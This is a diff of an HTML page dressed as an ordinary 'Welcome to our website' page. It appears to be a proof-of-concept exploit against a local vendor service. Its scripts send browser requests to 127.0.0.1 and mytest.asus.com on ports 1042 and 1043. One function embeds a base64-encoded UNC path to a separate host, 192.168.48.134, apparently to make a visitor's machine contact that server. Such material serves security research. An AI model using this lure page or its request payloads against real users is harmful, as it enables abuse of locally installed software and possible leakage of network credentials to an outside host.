@@ -9,7 +9,8 @@
     <h1>Welcome to our website!</h1>
     <p>Loading content, please wait...</p>
     <button type="button" onclick="sendRequest1()">Send to 127.0.0.1</button>
-    <button type="button" onclick="sendRequest2()">Send to mytest.asus.com</button>
+    <button type="button" onclick="sendRequest2()">Send to mytest.asus.com with HTTP</button>
+    <button type="button" onclick="sendRequest3()">Send to mytest.asus.com with HTTPS</button>
     <button type="button" onclick="putImage1()">Put image with HTTP request</button>
     <button type="button" onclick="putImage2()">Put image with UNC network paths</button>
     <script>
@@ -18,6 +19,10 @@
         }
 
         function sendRequest2() {
+            fetch('http://mytest.asus.com:1042/lib/1/language');
+        }
+
+        function sendRequest3() {
             fetch('https://mytest.asus.com:1043/lib/1/language');
         }
 
@@ -28,10 +33,10 @@
         }
 
         function putImage2() {
-                const img = document.createElement('img');
-                img.src = 'http://127.0.0.1:1042/type/1/model/x/image/' + btoa('\\\\192.168.48.134\\s\\i.jpg');
-                document.body.appendChild(img);
-            }
+            const img = document.createElement('img');
+            img.src = 'http://127.0.0.1:1042/type/1/model/x/image/' + btoa('\\\\192.168.48.134\\s\\i.jpg');
+            document.body.appendChild(img);
+        }
     </script>
 </body>
 
